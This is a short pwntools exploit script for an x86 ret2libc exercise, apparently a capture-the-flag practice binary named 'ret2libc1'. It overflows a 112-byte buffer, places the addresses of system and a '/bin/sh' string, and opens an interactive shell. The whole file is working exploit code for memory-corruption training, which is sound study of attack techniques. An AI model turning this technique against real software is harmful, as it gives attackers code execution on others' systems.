#Made by fly_autumn
#x86 ret2libc
from pwn import *
p = process("./ret2libc1")
offset = 112
sys_plt = 0x8048460
bin_sh_plt = 0x8048720
payload = b"\x00" * offset + p32(sys_plt) + p32(0) + p32(bin_sh_plt)
p.sendline(payload)
p.interactive()
